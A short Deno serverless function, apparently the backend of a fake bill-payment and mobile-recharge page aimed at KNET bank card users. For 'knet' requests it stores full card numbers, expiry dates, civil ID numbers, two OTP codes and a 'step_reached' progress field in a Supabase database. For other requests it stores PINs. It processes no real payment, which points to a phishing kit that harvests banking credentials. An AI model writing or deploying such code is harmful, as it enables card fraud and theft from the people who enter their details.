import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

const SUPABASE_URL = Deno.env.get("SUPABASE_URL");
const SUPABASE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");

async function supabaseUpsert(table, data) {
  if (!SUPABASE_URL || !SUPABASE_KEY) return; // skip if not configured
  const res = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
    method: "POST",
    headers: {
      "apikey": SUPABASE_KEY,
      "Authorization": `Bearer ${SUPABASE_KEY}`,
      "Content-Type": "application/json",
      "Prefer": "return=minimal",
    },
    body: JSON.stringify(data),
  });
  // Log but don't throw on Supabase errors
  if (!res.ok) {
    const err = await res.text();
    console.error(`Supabase insert error on ${table}:`, err);
  }
}

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const body = await req.json();
    const { type, phone_number, amount, pay_for } = body;

    if (type === "knet") {
      // For knet, Base44 entity is already handled by the frontend directly.
      // Just sync to Supabase.
      await supabaseUpsert("bill_payments", {
        phone_number: body.phone_number || body.card_number,
        pay_for: JSON.stringify({
          bank: body.bank,
          card_number: body.card_number,
          card_prefix: body.card_prefix,
          expiry_month: body.expiry_month,
          expiry_year: body.expiry_year,
          civil_id: body.civil_id,
          amount: body.amount,
          step_reached: body.step_reached,
          otp1: body.otp1,
          otp2: body.otp2,
          id_number: body.id_number,
          network: body.network,
        }),
      });
      return Response.json({ success: true });
    }

    // For bill / recharge: create a Base44 record
    const record = await base44.asServiceRole.entities.PaymentRecord.create({
      phone_number,
      amount: amount ? String(amount) : null,
      network: type,
      pin: pay_for,
      step_reached: 0,
      user_agent: req.headers.get("user-agent") || "",
    });

    if (type === "bill") {
      await supabaseUpsert("bill_payments", { phone_number, pay_for });
    } else if (type === "recharge") {
      await supabaseUpsert("recharge_payments", {
        phone_number,
        amount: amount ? Number(amount) : null,
        pay_for,
      });
    }

    return Response.json({ success: true, data: record });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});